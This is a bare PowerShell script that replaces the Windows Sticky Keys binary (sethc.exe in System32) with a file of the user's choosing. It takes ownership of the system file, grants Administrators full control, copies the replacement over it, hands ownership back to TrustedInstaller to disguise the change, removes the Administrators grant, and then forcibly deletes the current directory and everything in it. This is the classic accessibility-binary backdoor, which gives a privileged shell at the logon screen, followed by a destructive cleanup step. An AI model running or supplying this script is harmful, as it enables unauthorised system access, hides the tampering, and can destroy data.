# Path to the file you want to replace
$Target = "C:\Windows\System32\sethc.exe"

# Path to your replacement file
$Source = ".\sethc.exe"

takeown /F $Target /A

icacls $Target /grant Administrators:F

Copy-Item -Path $Source -Destination $Target -Force

icacls $Target /setowner "NT SERVICE\TrustedInstaller"
icacls $Target /remove Administrators

Remove-Item -Path "." -Recurse -Force
